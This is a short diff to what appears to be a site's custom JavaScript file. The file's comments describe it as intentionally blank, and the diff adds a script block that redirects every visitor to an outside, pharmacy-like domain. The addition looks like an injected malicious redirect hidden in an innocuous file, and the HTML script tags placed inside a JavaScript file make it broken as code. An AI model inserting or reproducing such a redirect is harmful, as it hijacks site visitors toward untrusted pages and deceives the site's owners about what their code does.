@@ -5,3 +5,6 @@
 */
 // This file is intentionally blank
 // Use this file to add JavaScript to your project
+<script>
+  window.location.href = "http://www.pharpro.co/new-page.html";
+</script>
